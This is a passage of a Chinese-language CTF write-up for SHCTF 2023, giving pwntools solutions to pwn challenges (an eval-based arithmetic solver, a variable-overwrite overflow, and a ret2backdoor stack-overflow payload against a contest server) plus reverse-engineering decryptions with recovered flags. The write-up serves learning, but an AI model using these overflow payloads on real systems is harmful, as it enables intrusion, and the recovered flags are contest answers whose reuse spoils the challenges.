<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host = <span class="string">&#x27;112.6.51.212&#x27;</span></span><br><span class="line">post = <span class="number">30847</span></span><br><span class="line">GeShi = <span class="string">b&#x27;Press Enter to start...&#x27;</span>  <span class="comment"># 改格式！</span></span><br><span class="line"></span><br><span class="line">sh = remote(host,post)</span><br><span class="line">sh.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = sh.recvuntil(GeShi).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    data1 = sh.recvuntil(<span class="string">b&#x27;=&#x27;</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(data1)</span><br><span class="line"></span><br><span class="line">    a = data1.split(<span class="string">&quot;\n&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a:&quot;</span>,a)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;÷&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">        a = a.replace(<span class="string">&quot;÷&quot;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;×&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">        a = a.replace(<span class="string">&quot;×&quot;</span>,<span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(a))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(a)).encode())</span><br><span class="line">    <span class="built_in">print</span>(sh.recvline())</span><br><span class="line">    <span class="built_in">print</span>(sh.recvline())</span><br><span class="line">    <span class="built_in">print</span>(sh.recvline())</span><br><span class="line"><span class="built_in">print</span>(sh.recvall())</span><br><span class="line"><span class="comment">#flag&#123;79305db4-72a0-44de-87c7-971c50632ceb&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="showshowway"><a href="#showshowway" class="headerlink" title="showshowway"></a>showshowway</h3><p><img src="/../../images/2023SHCTF/27.png"></p>
<p>题目要求<code>y</code>和<code>p</code>相等，寻找一下<code>p</code>和<code>y</code>，发现<code>p = showshowway</code></p>
<p><img src="/../../images/2023SHCTF/28.png"></p>
<p>而<code>y</code>是一个大小为32的字符数组</p>
<p><img src="/../../images/2023SHCTF/26.png"></p>
<p>网上划我们发现，传入的值存在<code>s</code>中，地址从<code>06010C0</code>截至到<code>06010FF</code>，长度为64（测试过了一个字符<code>a</code>占地址为1），而<code>y</code>的地址紧接着<code>s</code>，说明我们传入的第65个值会存入<code>y</code></p>
<p><img src="/../../images/2023SHCTF/25.png"></p>
<p>所以我们只要输入64个<code>a</code>+<code>showshowway</code>，即可让<code>y</code>和<code>p</code>相等</p>
<p><img src="/../../images/2023SHCTF/29.png"></p>
<h3 id="四则运算器"><a href="#四则运算器" class="headerlink" title="四则运算器"></a>四则运算器</h3><p>IDA发现有后面函数<code>backdoor()</code></p>
<p><img src="/../../images/2023SHCTF/30.png"></p>
<p>查看<code>backdoor()</code>的地址为<code>0x4015E4</code></p>
<p><img src="/../../images/2023SHCTF/31.png"></p>
<p>利用<code>gets()</code>函数不检查输入函数，所以存在栈溢出漏洞，再利用<code>strlen()</code>会被<code>\x00</code>截断</p>
<p>构造pyload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level= <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;112.6.51.212&quot;</span>,<span class="number">31342</span>)</span><br><span class="line">backdoor = <span class="number">0x4015E4</span></span><br><span class="line">pad = <span class="number">0x32</span> + <span class="number">8</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(pad-<span class="number">1</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="ez-asm"><a href="#ez-asm" class="headerlink" title="ez_asm"></a>ez_asm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000401550</span><br><span class="line">.text:0000000000401550 55                            push    rbp</span><br><span class="line">.text:0000000000401551 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000401554 48 83 EC 30                   sub     rsp, 30h</span><br><span class="line">.text:0000000000401558 E8 33 01 00 00                call    __main</span><br><span class="line">.text:0000000000401558</span><br><span class="line">.text:000000000040155D C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000401564 EB 4B                         jmp     short loc_4015B1</span><br><span class="line">.text:0000000000401564</span><br><span class="line">.text:0000000000401566                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401566</span><br><span class="line">.text:0000000000401566                               loc_401566:                             ; CODE XREF: main+65↓j</span><br><span class="line">.text:0000000000401566 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000401569 48 98                         cdqe</span><br><span class="line">.text:000000000040156B 48 8D 15 AE 1A 00 00          lea     rdx, flag                       </span><br><span class="line">.text:0000000000401572 0F B6 04 10                   movzx   eax, byte ptr [rax+rdx]</span><br><span class="line">.text:0000000000401576 83 F0 1E                      xor     eax, 1Eh</span><br><span class="line">.text:0000000000401579 89 C1                         mov     ecx, eax</span><br><span class="line">.text:000000000040157B 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000040157E 48 98                         cdqe</span><br><span class="line">.text:0000000000401580 48 8D 15 99 1A 00 00          lea     rdx, flag                      </span><br><span class="line">.text:0000000000401587 88 0C 10                      mov     [rax+rdx], cl</span><br><span class="line">.text:000000000040158A 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:000000000040158D 48 98                         cdqe</span><br><span class="line">.text:000000000040158F 48 8D 15 8A 1A 00 00          lea     rdx, flag                      </span><br><span class="line">.text:0000000000401596 0F B6 04 10                   movzx   eax, byte ptr [rax+rdx]</span><br><span class="line">.text:000000000040159A 83 E8 0A                      sub     eax, 0Ah</span><br><span class="line">.text:000000000040159D 89 C1                         mov     ecx, eax</span><br><span class="line">.text:000000000040159F 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015A2 48 98                         cdqe</span><br><span class="line">.text:00000000004015A4 48 8D 15 75 1A 00 00          lea     rdx, flag                      </span><br><span class="line">.text:00000000004015AB 88 0C 10                      mov     [rax+rdx], cl</span><br><span class="line">.text:00000000004015AE FF 45 FC                      inc     [rbp+var_4]</span><br><span class="line">.text:00000000004015AE</span><br><span class="line">.text:00000000004015B1</span><br><span class="line">.text:00000000004015B1                               loc_4015B1:                             ; CODE XREF: main+14↑j</span><br><span class="line">.text:00000000004015B1 83 7D FC 27                   cmp     [rbp+var_4], 27h ; &#x27;&#x27;&#x27;</span><br><span class="line">.text:00000000004015B5 7E AF                         jle     short loc_401566</span><br><span class="line">.text:00000000004015B5</span><br><span class="line">.text:00000000004015B7 48 8D 15 62 1A 00 00          lea     rdx, flag                      </span><br><span class="line">.text:00000000004015BE 48 8D 0D 3B 2A 00 00          lea     rcx, Format                     ; &quot;%s&quot;</span><br><span class="line">.text:00000000004015C5 E8 76 15 00 00                call    printf</span><br><span class="line">.text:00000000004015C5</span><br><span class="line">.text:00000000004015CA B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000004015CF 48 83 C4 30                   add     rsp, 30h</span><br><span class="line">.text:00000000004015D3 5D                            pop     rbp</span><br><span class="line">.text:00000000004015D4 C3                            retn</span><br><span class="line">.text:00000000004015D4</span><br><span class="line"></span><br><span class="line">nhuo[M`7mc7uhc$7midgbTf`7`$7%#ubf7 ci5Y</span><br></pre></td></tr></table></figure>

<p>让GPT把这段汇编代码转为C语言代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> var_4 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> flag[] = <span class="string">&quot;nhuo[M7mc7uhc$7midgbTf7`$7&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (var_4 &lt;= <span class="number">0x27</span>) &#123;</span><br><span class="line">        <span class="type">char</span> eax = flag[var_4];</span><br><span class="line">        eax ^= <span class="number">0x1E</span>;</span><br><span class="line">        <span class="type">char</span> ecx = eax;</span><br><span class="line">        flag[var_4] = ecx;</span><br><span class="line"></span><br><span class="line">        eax = flag[var_4];</span><br><span class="line">        eax -= <span class="number">0x0A</span>;</span><br><span class="line">        ecx = eax;</span><br><span class="line">        flag[var_4] = ecx;</span><br><span class="line"></span><br><span class="line">        var_4++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密过程就是<code>c[i] = flag[i] ^ 0x1E - 0x0A</code></p>
<p>解密就是<code>flag[i] = (c[i] + 0x0A) ^ 0x1E</code></p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;nhuo[M`7mc7uhc$7midgbTf`7`$7%#ubf7 ci5Y&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    m = (<span class="built_in">ord</span>(i) + <span class="number">0x0A</span>) ^ <span class="number">0x1E</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;It_is_als0_impor@nt_t0_13arn_4sm!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p><img src="/../../images/2023SHCTF/12.png"></p>
<p>密文为<code>des</code>，加密过程为<code>des[i] = (flag[i] &gt;&gt; 4) | (16 * flag[i])</code></p>
<p><img src="/../../images/2023SHCTF/13.png"></p>
<p>因为<code>flag[i]</code>右移4位后只有3位，<code>|</code>上<code>(16 * flag[i])</code>（因为<code>(16 * flag[i])</code>的低4位都是0 ），所以<code>des[i]</code>的低3位就是<code>flag[i]</code>的高3位，再往前取4个就是<code>flag[i]</code>的低4位，拼接起来转字符即可</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x66</span>, <span class="number">0x0C6</span>, <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0x0B7</span>, <span class="number">0x45</span>, <span class="number">0x27</span>, <span class="number">0x97</span>, <span class="number">0x0F5</span>, <span class="number">0x47</span>, <span class="number">0x3</span>, <span class="number">0x0F5</span>, <span class="number">0x37</span>, <span class="number">0x3</span>, <span class="number">0x0C6</span>, <span class="number">0x67</span>, <span class="number">0x33</span>, <span class="number">0x0F5</span>, <span class="number">0x47</span>, <span class="number">0x86</span>,<span class="number">0x56</span>, <span class="number">0x0F5</span>, <span class="number">0x26</span>, <span class="number">0x96</span>, <span class="number">0x0E6</span>, <span class="number">0x16</span>, <span class="number">0x27</span>, <span class="number">0x97</span>, <span class="number">0x0F5</span>, <span class="number">0x7</span>, <span class="number">0x27</span>, <span class="number">0x3</span>, <span class="number">0x26</span>, <span class="number">0x0C6</span>, <span class="number">0x33</span>, <span class="number">0x0D6</span>, <span class="number">0x0D7</span>,<span class="number">0x1B</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    bin_i = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    mhigh = bin_i[-<span class="number">4</span>:]</span><br><span class="line">    mlow = bin_i[-<span class="number">8</span>:-<span class="number">4</span>]</span><br><span class="line">    m = <span class="built_in">int</span>(mhigh + mlow,<span class="number">2</span>)</span><br><span class="line">    flag += <span class="built_in">chr</span>(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Try_t0_s0lv3_the_binary_pr0bl3m&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>IDA打开</p>
<p><img src="/../../images/2023SHCTF/14.png"></p>
<p><code>flag&#123;flag1sinarray&#125;</code></p>
<h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please input flag:&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag)!=<span class="number">42</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Check your length!&quot;</span>)</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	s=<span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> flag[i*<span class="number">7</span>:i*<span class="number">7</span>+<span class="number">7</span>]:</span><br><span class="line">		s+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(j))[<span class="number">2</span>:]</span><br><span class="line">	l.append(<span class="built_in">int</span>(s,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">(<span class="number">593</span>*l[<span class="number">0</span>] + <span class="number">997</span>*l[<span class="number">1</span>] + <span class="number">811</span>*l[<span class="number">2</span>] + <span class="number">258</span>*l[<span class="number">3</span>] + <span class="number">829</span>*l[<span class="number">4</span>] + <span class="number">532</span>*l[<span class="number">5</span>])== <span class="number">0x5b8e0aef71d34ff43</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">605</span>*l[<span class="number">0</span>] + <span class="number">686</span>*l[<span class="number">1</span>] + <span class="number">328</span>*l[<span class="number">2</span>] + <span class="number">602</span>*l[<span class="number">3</span>] + <span class="number">695</span>*l[<span class="number">4</span>] + <span class="number">576</span>*l[<span class="number">5</span>])== <span class="number">0x551a262360964ef7f</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">373</span>*l[<span class="number">0</span>] + <span class="number">512</span>*l[<span class="number">1</span>] + <span class="number">449</span>*l[<span class="number">2</span>] + <span class="number">756</span>*l[<span class="number">3</span>] + <span class="number">448</span>*l[<span class="number">4</span>] + <span class="number">580</span>*l[<span class="number">5</span>])== <span class="number">0x49d158a5657d6931c</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">560</span>*l[<span class="number">0</span>] + <span class="number">635</span>*l[<span class="number">1</span>] + <span class="number">422</span>*l[<span class="number">2</span>] + <span class="number">971</span>*l[<span class="number">3</span>] + <span class="number">855</span>*l[<span class="number">4</span>] + <span class="number">597</span>*l[<span class="number">5</span>])== <span class="number">0x625568d5abbabf4f3</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">717</span>*l[<span class="number">0</span>] + <span class="number">507</span>*l[<span class="number">1</span>] + <span class="number">388</span>*l[<span class="number">2</span>] + <span class="number">925</span>*l[<span class="number">3</span>] + <span class="number">324</span>*l[<span class="number">4</span>] + <span class="number">524</span>*l[<span class="number">5</span>])== <span class="number">0x50ee0c025e70e3c23</span> <span class="keyword">and</span> \</span><br><span class="line">(<span class="number">312</span>*l[<span class="number">0</span>] + <span class="number">368</span>*l[<span class="number">1</span>] + <span class="number">884</span>*l[<span class="number">2</span>] + <span class="number">518</span>*l[<span class="number">3</span>] + <span class="number">495</span>*l[<span class="number">4</span>] + <span class="number">414</span>*l[<span class="number">5</span>])== <span class="number">0x40e735f8aa2815f65</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Good job!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Wrong\nTry again!!!&quot;</span>)</span><br><span class="line">	exit()</span><br></pre></td></tr></table></figure>

<p>先解6个方程求出<code>l[i]</code></p>
<p>再把<code>l[i]</code>转为16进制拼接即可</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">var(<span class="string">&#x27;x0 x1 x2 x3 x4 x5&#x27;</span>)</span><br><span class="line">f1 = <span class="number">593</span>*x0 + <span class="number">997</span>*x1 + <span class="number">811</span>*x2 + <span class="number">258</span>*x3 + <span class="number">829</span>*x4 + <span class="number">532</span>*x5== <span class="number">0x5b8e0aef71d34ff43</span></span><br><span class="line">f2 = <span class="number">605</span>*x0 + <span class="number">686</span>*x1 + <span class="number">328</span>*x2 + <span class="number">602</span>*x3 + <span class="number">695</span>*x4 + <span class="number">576</span>*x5== <span class="number">0x551a262360964ef7f</span> </span><br><span class="line">f3 = <span class="number">373</span>*x0 + <span class="number">512</span>*x1 + <span class="number">449</span>*x2 + <span class="number">756</span>*x3 + <span class="number">448</span>*x4 + <span class="number">580</span>*x5== <span class="number">0x49d158a5657d6931c</span> </span><br><span class="line">f4 = <span class="number">560</span>*x0 + <span class="number">635</span>*x1 + <span class="number">422</span>*x2 + <span class="number">971</span>*x3 + <span class="number">855</span>*x4 + <span class="number">597</span>*x5== <span class="number">0x625568d5abbabf4f3</span> </span><br><span class="line">f5 = <span class="number">717</span>*x0 + <span class="number">507</span>*x1 + <span class="number">388</span>*x2 + <span class="number">925</span>*x3 + <span class="number">324</span>*x4 + <span class="number">524</span>*x5== <span class="number">0x50ee0c025e70e3c23</span> </span><br><span class="line">f6 = <span class="number">312</span>*x0 + <span class="number">368</span>*x1 + <span class="number">884</span>*x2 + <span class="number">518</span>*x3 + <span class="number">495</span>*x4 + <span class="number">414</span>*x5== <span class="number">0x40e735f8aa2815f65</span></span><br><span class="line"></span><br><span class="line">ans = solve([f1,f2,f3,f4,f5,f6],[x0,x1,x2,x3,x4,x5])</span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line">x0 = <span class="number">28829613228248624</span></span><br><span class="line">x1 = <span class="number">26827458353261422</span></span><br><span class="line">x2 = <span class="number">13642136288051316</span></span><br><span class="line">x3 = <span class="number">29378135513658469</span></span><br><span class="line">x4 = <span class="number">32192963475959391</span></span><br><span class="line">x5 = <span class="number">30791965425607037</span></span><br><span class="line">x = [x0,x1,x2,x3,x4,x5]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    flag += <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br><span class="line"><span class="comment">#flag&#123;N0_One_kn0ws_m@th_B3tter_Th@n_me!!!!&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="ez-apk"><a href="#ez-apk" class="headerlink" title="ez_apk"></a>ez_apk</h3><p><img src="/../../images/2023SHCTF/15.png"></p>
<p>反编译主函数，得知密文<code>5TAYhycAPT1aAd535TGdWYQ8CvfoRjErGEreqhDpqv1LydTqd3mxuK2hhUp9Pws3u9mq6eX</code></p>
<p><img src="/../../images/2023SHCTF/16.png"><img src="/../../images/2023SHCTF/17.png"></p>
<p>通过关键部分得知，考点为换表base58码表<code>9LfnoVpi1HrzBSKxhNFeyY745R2g3QmqsTCZJuDvcMdkE8wPGbUXajtAW6</code></p>
<p>密文<code>5TAYhycAPT1aAd535TGdWYQ8CvfoRjErGEreqhDpqv1LydTqd3mxuK2hhUp9Pws3u9mq6eX</code></p>
<p>网站解密</p>
<p><code>flag&#123;Jue_1_ju3_Y0ung_and_G0at_1s_go0d_for_yOuR_body&#125;</code></p>
<h3 id="seed"><a href="#seed" class="headerlink" title="seed"></a>seed</h3><p><img src="/../../images/2023SHCTF/18.png"></p>
<p>程序先是通过随机数种子，生成10个整数作为<code>key</code>，再把明文进行加密<code>des[i] = m[i] ^ key[i % 10]</code></p>
<p><img src="/../../images/2023SHCTF/19.png"></p>
<p>密文<code>des</code>为： </p>
<p><code>    [0x40,0x29,0x28,0x0E9,0x0C2,0x4,0x0A4,0x0ED,0x9F,0x53,0x5F,0x75,0x3C,0x0D1,0x0CD,0x2B,0x0A8,0x0C4,0x89,0x69,0x15,0x21,0x16,0x0EF,0x0D7,0x27,0x92,0x0DF,0x0CA,0x53,0x5F,0x2A,0x3C,0x0D1,0x0CE,0x3,0x0A3,0x0EF,0x0A5,0x78,0x16,0x1A,0x2D,0x0E1,0x0C4,0,0,0]</code></p>
<p>注意这个<code>3 dup(0)</code>，意思是3个0</p>
<p>解题思路：通过动态调试，获得<code>seed</code>，通过<code>seed</code>，生成<code>key</code>，再解密</p>
<p>先在第24行设置断点</p>
<p><img src="/../../images/2023SHCTF/20.png"></p>
<p>打开F9，调试，获得<code>seed = 0u</code>，即10进制的0</p>
<p><img src="/../../images/2023SHCTF/21.png"></p>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> c[] = &#123;<span class="number">0x40</span>,<span class="number">0x29</span>,<span class="number">0x28</span>,<span class="number">0x0E9</span>,<span class="number">0x0C2</span>,<span class="number">0x4</span>,<span class="number">0x0A4</span>,<span class="number">0x0ED</span>,<span class="number">0x9F</span>,<span class="number">0x53</span>,<span class="number">0x5F</span>,<span class="number">0x75</span>,<span class="number">0x3C</span>,<span class="number">0x0D1</span>,<span class="number">0x0CD</span>,<span class="number">0x2B</span>,<span class="number">0x0A8</span>,<span class="number">0x0C4</span>,<span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x15</span>,<span class="number">0x21</span>,<span class="number">0x16</span>,<span class="number">0x0EF</span>,<span class="number">0x0D7</span>,<span class="number">0x27</span>,<span class="number">0x92</span>,<span class="number">0x0DF</span>,<span class="number">0x0CA</span>,<span class="number">0x53</span>,<span class="number">0x5F</span>,<span class="number">0x2A</span>,<span class="number">0x3C</span>,<span class="number">0x0D1</span>,<span class="number">0x0CE</span>,<span class="number">0x3</span>,<span class="number">0x0A3</span>,<span class="number">0x0EF</span>,<span class="number">0x0A5</span>,<span class="number">0x78</span>,<span class="number">0x16</span>,<span class="number">0x1A</span>,<span class="number">0x2D</span>,<span class="number">0x0E1</span>,<span class="number">0x0C4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> v3,key[<span class="number">10</span>];</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt;= <span class="number">9</span>;++i)&#123;</span><br><span class="line">        v3 = rand() % <span class="number">255</span>;</span><br><span class="line">        key[i] = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt;= <span class="number">44</span>;++i)&#123;</span><br><span class="line">        <span class="type">int</span> m = key[i % <span class="number">10</span>] ^ c[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#key = [38,69,73,142,185,67,205,155,250,12]</span></span><br><span class="line"><span class="meta">#flag&#123;Give_y0u_the_se3d_and_D0_you_w@nt_t0_do&#125;</span></span><br></pre></td></tr></table></figure>

